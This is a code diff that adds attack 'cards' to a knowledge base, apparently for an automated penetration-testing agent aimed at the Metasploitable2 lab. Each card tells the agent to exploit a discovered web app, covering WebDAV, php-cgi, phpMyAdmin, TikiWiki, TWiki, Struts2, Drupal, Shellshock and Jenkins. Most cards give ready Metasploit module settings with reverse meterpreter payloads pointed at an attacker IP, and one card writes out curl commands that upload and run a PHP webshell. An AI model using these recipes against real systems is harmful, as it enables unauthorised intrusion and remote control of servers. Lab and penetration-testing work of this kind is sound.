@@ -465,6 +465,140 @@ def main():
   start with 3 and, on failure, let the retry loop try other indexes.""",
     ))
 
+    # =====================================================================
+    # WEB: doutrina + receitas por APP (usam a sub-fase de enumeracao web)
+    # =====================================================================
+    cards.append(format_tactical_card(
+        name="web_enumeration_doctrine",
+        keywords="http https web apache nginx php javascript enumeration targeturi vhost path app",
+        description="How to attack a web port: the banner is NOT the target; the app is.",
+        instructions="""
+        A web SERVER banner (Apache/nginx/IIS/PHP/Node) does NOT tell you what is
+        vulnerable. The vulnerability lives in the APPLICATION behind a PATH.
+        ALWAYS read the WEB ENUMERATION findings (http-enum/title/headers/methods)
+        provided for the port and act on DISCOVERED paths/apps:
+          - Map each discovered path to an app, then to a module (see web cards).
+          - Set the EXACT path in "TARGETURI" (e.g. "TARGETURI": "/tikiwiki/").
+          - Use "VHOST" if the app answers on a specific hostname.
+          - PHP apps -> php/* payloads (e.g. php/meterpreter/reverse_tcp).
+          - If headers show "DAV" or methods include PUT -> WebDAV upload (see card).
+          - If headers show "X-Powered-By: PHP/5.x" served via CGI -> php_cgi card.
+        If nothing exploitable is discovered, run auxiliary/scanner/http/dir_scanner
+        (strategy enumeration) to find more paths, then re-evaluate.
+        nginx itself rarely has RCE: focus on the app it proxies.
+        """
+    ))
+
+    cards.append(attack_card(
+        name="web_webdav_upload",
+        ports="80, 443, 8080", banner_match='HTTP headers show "DAV"/"DAV/2" or PUT allowed',
+        keywords="webdav dav put upload webshell apache /dav writable http",
+        strategy="enumeration",
+        module="auxiliary/scanner/http/webdav_scanner",
+        required_options='    "PATH": "/"',
+        why="""  WebDAV lets you WRITE files. First confirm with webdav_scanner. On
+  Metasploitable2 the /dav/ folder is writable. There is no single MSF exploit:
+  UPLOAD a webshell manually (TIER C) and browse to it.""",
+        if_missing="""  TIER C (missing_module_manual_poc): upload and trigger a shell, e.g.
+    curl -T shell.php http://<TARGET>/dav/shell.php
+    curl 'http://<TARGET>/dav/shell.php?cmd=id'
+  (use a simple PHP system($_GET[cmd]) shell).""",
+        after_session="A webshell runs as www-data; then local privesc.",
+    ))
+
+    cards.append(attack_card(
+        name="web_php_cgi_arg_injection",
+        ports="80, 443", banner_match='HTTP header "X-Powered-By: PHP/5.x" (php-cgi)',
+        keywords="php cgi argument injection cve-2012-1823 php5 x-powered-by rce",
+        strategy="exploit_cve",
+        module="exploit/multi/http/php_cgi_arg_injection",
+        required_options='    "TARGETURI": "/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  CVE-2012-1823: PHP running as a CGI accepts command-line args in the query
+  string -> RCE. The X-Powered-By: PHP/5.3.x/5.4.x header is the signal. PHP
+  payload (set LHOST/LPORT).""",
+    ))
+
+    cards.append(attack_card(
+        name="web_phpmyadmin",
+        ports="80, 443, 8080", banner_match='http-enum found "/phpMyAdmin/" or "/phpmyadmin/"',
+        keywords="phpmyadmin web sql rce lfi setup targeturi credentials",
+        strategy="exploit_cve",
+        module="exploit/multi/http/phpmyadmin_lfi_rce",
+        required_options='    "TARGETURI": "/phpMyAdmin/", "USERNAME": "root", "PASSWORD": "", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  Set TARGETURI to the discovered path. phpMyAdmin exploits are VERSION-specific
+  and usually need DB creds (try root/blank on Metasploitable2). If this exact
+  module is missing, search for the right one.""",
+        if_missing="""  1. search phpmyadmin   (pick the module matching the installed version)
+  2. If only info disclosure, read config/version then switch module.
+  3. TIER C: searchsploit phpmyadmin <version>.""",
+    ))
+
+    cards.append(attack_card(
+        name="web_tikiwiki",
+        ports="80, 443", banner_match='http-enum found "/tikiwiki/" or "/tiki/"',
+        keywords="tikiwiki tiki web php rce graph formula targeturi metasploitable",
+        strategy="exploit_cve",
+        module="exploit/unix/webapp/tikiwiki_graph_formula_exec",
+        required_options='    "TARGETURI": "/tikiwiki/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  Old TikiWiki (on Metasploitable2) has a PHP code-eval RCE. Set TARGETURI to the
+  discovered path. If the module name differs, search 'tikiwiki'.""",
+    ))
+
+    cards.append(attack_card(
+        name="web_twiki",
+        ports="80, 443", banner_match='http-enum found "/twiki/"',
+        keywords="twiki web perl rce history rev targeturi cgi",
+        strategy="exploit_cve",
+        module="exploit/unix/webapp/twiki_history",
+        required_options='    "TARGETURI": "/twiki/", "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  TWiki 'rev' parameter command injection. Set TARGETURI to the discovered path.
+  If missing, search 'twiki'.""",
+    ))
+
+    cards.append(attack_card(
+        name="web_struts2",
+        ports="80, 443, 8080", banner_match='Java app / .action/.do URLs (Apache Struts)',
+        keywords="struts struts2 ognl content-type java rce cve-2017-5638 targeturi",
+        strategy="exploit_cve",
+        module="exploit/multi/http/struts2_content_type_ognl",
+        required_options='    "TARGETURI": "/<app>.action", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  CVE-2017-5638 (OGNL via Content-Type). Set TARGETURI to a real .action/.do
+  endpoint found in enumeration. Many Struts CVEs exist; search 'struts' and pick
+  the one matching the version/vector.""",
+    ))
+
+    cards.append(attack_card(
+        name="web_drupalgeddon2",
+        ports="80, 443", banner_match='http-enum found "/user/register" or CHANGELOG Drupal',
+        keywords="drupal drupalgeddon cve-2018-7600 php rce targeturi cms",
+        strategy="exploit_cve",
+        module="exploit/unix/webapp/drupal_drupalgeddon2",
+        required_options='    "TARGETURI": "/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  CVE-2018-7600 (Drupal 7/8 unauth RCE). Set TARGETURI to the Drupal root path.""",
+    ))
+
+    cards.append(attack_card(
+        name="web_shellshock_cgi",
+        ports="80, 443", banner_match='http-enum found "/cgi-bin/" scripts (bash CGI)',
+        keywords="shellshock bash cgi cve-2014-6271 apache mod_cgi env rce targeturi",
+        strategy="exploit_cve",
+        module="exploit/multi/http/apache_mod_cgi_bash_env_exec",
+        required_options='    "TARGETURI": "/cgi-bin/<script>", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  CVE-2014-6271 (Shellshock). TARGETURI must point at a REAL cgi script found in
+  enumeration (e.g. /cgi-bin/status). A wrong TARGETURI fails silently.""",
+    ))
+
+    cards.append(attack_card(
+        name="web_jenkins_script_console",
+        ports="8080, 8081, 80", banner_match='http-title/headers show "Jenkins"',
+        keywords="jenkins script console groovy rce java targeturi ci",
+        strategy="exploit_cve",
+        module="exploit/multi/http/jenkins_script_console",
+        required_options='    "TARGETURI": "/", "PAYLOAD": "java/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
+        why="""  If the Groovy script console is unauthenticated (or creds known), this is RCE.
+  Set TARGETURI to the Jenkins base path. Add "USERNAME"/"PASSWORD" if required.""",
+    ))
+
     # ---- salva ----
     output_path = os.getenv("TACTICAL_OUT", "/app/config/ingest/kb_tactical.txt")
     os.makedirs(os.path.dirname(output_path), exist_ok=True)
